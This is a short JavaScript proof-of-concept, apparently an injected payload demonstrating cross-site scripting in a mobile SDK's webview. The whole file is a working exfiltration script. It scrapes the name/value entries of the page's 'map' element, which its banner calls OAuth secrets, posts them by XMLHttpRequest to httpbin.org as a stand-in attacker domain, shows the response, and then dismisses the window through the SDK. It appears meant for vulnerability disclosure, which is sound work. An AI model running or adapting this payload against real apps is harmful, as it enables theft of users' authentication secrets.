!function(){

  document.getElementsByTagName('span')[0].innerHTML = 'Attacker JavaScript successfully injected!<br /><br />I can now read the OAuth secrets contained in this window and exfiltrate using XMLHttpRequest to my own domain.';
  document.getElementsByClassName('header')[0].style.background = '#e91e63';

  var data = new FormData();

  for (let entry of document.getElementsByTagName('map')[0].getElementsByTagName('string')) {
    data.append(entry.getAttribute('name'), entry.innerHTML);
  }

  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://httpbin.org/anything', true);
  xhr.onload = function () {
    document.getElementsByClassName('header')[0].style.background = '#4caf50';
    document.getElementsByTagName('span')[0].innerHTML = 'Exfiltration successful!<br /><br />My JavaScript can automatically dismiss this window when this is done.<br /><br />Demo form response from httpbin.org below:';
    document.getElementsByClassName('pretty-print')[0].style.whiteSpace = 'pre';
    document.getElementsByClassName('pretty-print')[0].innerText = this.responseText;
    setTimeout(function() {
      ButtonSdk.onMessageReceived('{"type": "Button.webView.dismiss"}');
    }, 8000);
  };

  setTimeout(function() {
    xhr.send(data);  
  }, 8000);

}();